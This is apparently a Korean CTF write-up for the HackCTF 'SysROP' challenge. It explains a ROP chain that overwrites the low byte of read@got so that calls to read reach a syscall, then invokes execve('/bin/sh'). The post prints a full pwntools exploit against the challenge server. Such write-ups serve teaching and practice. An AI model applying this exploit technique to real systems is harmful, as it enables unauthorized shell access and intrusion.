---
title: "[HackCTF]SysROP"
date: 2019-12-29
tags: [HackCTF]
categories: [HackCTF]
---

그냥 웬만한 gadget 다 있길래 그냥 릭해서 풀라고 했는데 출력함수가 없었다.. 근데 가젯중에 `0x00000000004005ea : pop rax ; pop rdx ; pop rdi ; pop rsi ; ret` 이런게 존재해서 rax에 syscall 번호를 넣어주고 가젯들 세팅해주면 syscall을 이용할 수 있을거다. read 함수에서 syscall이 있어서 이를 이용하면 될거다.

`read@got`의 하위 1바이트를 0x5e로 overwrite하면 read함수 호출할 때마다 syscall이 호출될거다.

![](https://user-images.githubusercontent.com/32904385/71559865-62dfe700-2aa6-11ea-8af8-3498559254dd.png)

syscall을 이용해 `execve` 를 호출해 `execve('/bin/sh\x00',0,0)` 이런식으로 넣어주면 쉘이 실행될거다.

data영역에 `/bin/sh\x00` 을 넣고 `read@got` 의 하위 1바이트는 overwrite 해서 syscall 호출해 인자를 `execve('/bin/sh\x00',0,0)`  이렇게 만들어주면 된다. execve의 syscall num은 59다.

> exploit.py

```python
from pwn import *

e = ELF('./sysrop')
# p = process('./sysrop')
p = remote('ctf.j0n9hyun.xyz',3024)
libc = ELF('./libc.so.6')

data = 0x601030
syscall_gadget = 0x00000000004005ea # pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
pop3ret = 0x00000000004005eb # pop rdx ; pop rdi ; pop rsi ; ret
main = 0x00000000004005F2

payload = 'A'*0x18
payload += p64(pop3ret)
payload += p64(10) # rdx
payload += p64(0) # rdi
payload += p64(data) # rsi
payload += p64(e.plt['read'])
payload += p64(main)

p.sendline(payload)
sleep(0.1)
p.sendline('/bin/sh\x00')
sleep(0.1)

payload2 = 'A'*0x18
payload2 += p64(pop3ret)
payload2 += p64(1)# rdx
payload2 += p64(0) # rdi
payload2 += p64(e.got['read']) # rsi
payload2 += p64(e.plt['read'])

payload2 += p64(syscall_gadget)
payload2 += p64(59) # rax
payload2 += p64(0) # rdx
payload2 += p64(data) # rdi
payload2 += p64(0) # rsi
payload2 += p64(e.plt['read'])

p.sendline(payload2)
sleep(0.1)
p.sendline('\x5e')
sleep(0.1)

p.interactive()
```

